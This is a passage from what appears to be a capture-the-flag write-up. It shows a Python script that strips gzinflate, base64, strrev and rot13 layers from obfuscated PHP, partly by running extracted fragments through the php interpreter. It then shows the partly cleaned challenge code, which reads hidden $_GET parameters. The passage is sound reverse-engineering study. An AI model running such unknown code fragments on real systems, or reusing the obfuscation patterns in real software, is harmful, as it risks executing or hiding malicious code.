</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_noteq&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; %&#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_mod&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; &amp;&amp; &#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_and&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; * &#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_mul&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; &lt;&lt; &#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_shl&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; - &#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_sub&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; &gt; &#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_greater&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; ?? &#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_coalesce&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; + &#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_add&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;$&#39;</span><span class=o>+</span><span class=n>closure_name</span>
</span></span><span class=line><span class=cl>        <span class=n>closures</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>closure_name</span><span class=si>}</span><span class=s1>=&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=n>closure_code</span>
</span></span><span class=line><span class=cl>        <span class=n>closures</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;f(&#39;</span><span class=si>{</span><span class=n>v</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#39;)&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>closure_name</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>C_F</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>pattern</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;&#39;gzinflate&#39;\(&#39;(.*?)&#39;\)&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>flags</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>m</span> <span class=ow>in</span> <span class=n>re</span><span class=o>.</span><span class=n>finditer</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>fb</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>escb</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span> <span class=ow>in</span> <span class=n>b</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;res.php&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&lt;?php</span><span class=se>\n</span><span class=s1>echo &#39;</span> <span class=o>+</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;?&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s1>&#39;php&#39;</span><span class=p>,</span> <span class=s1>&#39;./res.php&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>out</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span> <span class=o>+</span> <span class=n>out</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pattern</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;&#39;join&#39;\(&#39;&#39;(.*?)\)\)&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>flags</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>m</span> <span class=ow>in</span> <span class=n>re</span><span class=o>.</span><span class=n>finditer</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>fb</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>escb</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span> <span class=ow>in</span> <span class=n>b</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;res.php&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&lt;?php</span><span class=se>\n</span><span class=s1>echo &#39;</span> <span class=o>+</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;?&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s1>&#39;php&#39;</span><span class=p>,</span> <span class=s1>&#39;./res.php&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>out</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span> <span class=o>+</span> <span class=n>out</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pattern</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;&#39;strrev&#39;\(&#39;(.*?)&#39;\)&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>m</span> <span class=ow>in</span> <span class=n>re</span><span class=o>.</span><span class=n>finditer</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>fb</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>escb</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span> <span class=ow>in</span> <span class=n>b</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span> <span class=o>+</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pattern</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;&#39;base64_decode&#39;\(&#39;(.*?)&#39;\)&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>m</span> <span class=ow>in</span> <span class=n>re</span><span class=o>.</span><span class=n>finditer</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>fb</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>escb</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span> <span class=ow>in</span> <span class=n>b</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span> <span class=o>+</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pattern</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;&#39;str_rot13&#39;\(&#39;(.*?)&#39;\)&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>flags</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>m</span> <span class=ow>in</span> <span class=n>re</span><span class=o>.</span><span class=n>finditer</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>fb</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>escb</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span> <span class=ow>in</span> <span class=n>b</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;res.php&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&lt;?php</span><span class=se>\n</span><span class=s1>echo &#39;</span> <span class=o>+</span> <span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;?&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s1>&#39;php&#39;</span><span class=p>,</span> <span class=s1>&#39;./res.php&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>out</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>m</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>0</span><span class=p>),</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span> <span class=o>+</span> <span class=n>out</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>splitlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>fb</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>fb</span><span class=p>[:</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=p>[</span><span class=n>closures</span><span class=p>]</span> <span class=o>+</span> <span class=n>fb</span><span class=p>[</span><span class=mi>1</span><span class=p>:])</span>
</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;ans.php&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>fb</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>This is where my deobfuscator ends and I figured I could do rest in less than 2 hours and faster than writing code for it.</p><h3 id=manual-labor->Manual labor :)</h3><p>Main obfuscation that is left is <code>goto</code>&rsquo;s I started from first goto and would cut and paste <code>goto</code> where it was intended. going along reading code and understanding which branch was useless. There was also some <code>xdebug</code> stuff which I donâ€™t know what it is. I guess itâ€™s anti debugging feature.
So hereâ€™s the important code left:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nv>$f_eq</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$AqgGmhEL</span><span class=p>,</span> <span class=nv>$yglIFDcU</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$AqgGmhEL</span> <span class=o>==</span> <span class=nv>$yglIFDcU</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$f_mod</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$lVAHbUyT</span><span class=p>,</span> <span class=nv>$ZmDBPQQb</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$lVAHbUyT</span> <span class=o>%</span> <span class=nv>$ZmDBPQQb</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$f_noteq</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$UkaweGRn</span><span class=p>,</span> <span class=nv>$BTnLyVMj</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$UkaweGRn</span> <span class=o>!==</span> <span class=nv>$BTnLyVMj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$f_shl</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$brwBPZbi</span><span class=p>,</span> <span class=nv>$XSqYpVLM</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$brwBPZbi</span> <span class=o>&lt;&lt;</span> <span class=nv>$XSqYpVLM</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$f_add</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$chPCUzwi</span><span class=p>,</span> <span class=nv>$jQZIfWpC</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$chPCUzwi</span> <span class=o>+</span> <span class=nv>$jQZIfWpC</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$f_and</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$GCzgcwRK</span><span class=p>,</span> <span class=nv>$RpMPZpmj</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$GCzgcwRK</span> <span class=o>&amp;&amp;</span> <span class=nv>$RpMPZpmj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$f_coalesce</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$jfqPCCoG</span><span class=p>,</span> <span class=nv>$xPNsVfmy</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$jfqPCCoG</span> <span class=o>??</span> <span class=nv>$xPNsVfmy</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$f_sub</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$RwedYeNC</span><span class=p>,</span> <span class=nv>$PXlHwEDN</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$RwedYeNC</span> <span class=o>-</span> <span class=nv>$PXlHwEDN</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$fclosure_8</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$rawCNgUo</span><span class=p>,</span> <span class=nv>$QHoVWrjC</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$rawCNgUo</span> <span class=o>||</span> <span class=nv>$QHoVWrjC</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$f_mul</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$ViVEpUJC</span><span class=p>,</span> <span class=nv>$bswJJhBe</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$ViVEpUJC</span> <span class=o>*</span> <span class=nv>$bswJJhBe</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$f_greater</span><span class=o>=</span><span class=k>function</span> <span class=p>(</span><span class=nv>$BQzBQbgM</span><span class=p>,</span> <span class=nv>$NMCgZusp</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$BQzBQbgM</span> <span class=o>&gt;</span> <span class=nv>$NMCgZusp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$g_1</span> <span class=o>=</span> <span class=nv>$g_2</span> <span class=o>=</span> <span class=nv>$g_3</span> <span class=o>=</span> <span class=nv>$g_4</span> <span class=o>=</span> <span class=nv>$g_5</span> <span class=o>=</span> <span class=nv>$DqWdnYFI</span> <span class=o>=</span> <span class=k>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$g_1</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;JnXB&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$g_2</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;xMSd&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$g_3</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;kgdG&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$f_eq</span><span class=p>(</span><span class=nv>$f_add</span><span class=p>(</span><span class=nv>$f_add</span><span class=p>(</span><span class=nv>$g_1</span><span class=p>,</span> <span class=nv>$g_2</span><span class=p>),</span> <span class=nv>$g_3</span><span class=p>),</span> <span class=nv>$f_mod</span><span class=p>(</span><span class=mi>1773</span><span class=p>,</span> <span class=mi>1056</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$g_4</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=nv>$g_1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>WknXvLos</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$f_eq</span><span class=p>(</span><span class=nv>$f_add</span><span class=p>(</span><span class=nv>$f_add</span><span class=p>(</span><span class=nv>$g_1</span><span class=p>,</span> <span class=nv>$g_2</span><span class=p>),</span> <span class=nv>$g_3</span><span class=p>),</span> <span class=nv>$f_coalesce</span><span class=p>(</span><span class=nv>$JXNMXmCP</span><span class=p>,</span> <span class=mi>266</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$g_5</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=nv>$g_2</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$g_5</span> <span class=o>=</span> <span class=nv>$f_add</span><span class=p>(</span><span class=nv>$f_add</span><span class=p>(</span><span class=nv>$g_1</span><span class=p>,</span> <span class=nv>$g_2</span><span class=p>),</span> <span class=nv>$g_3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
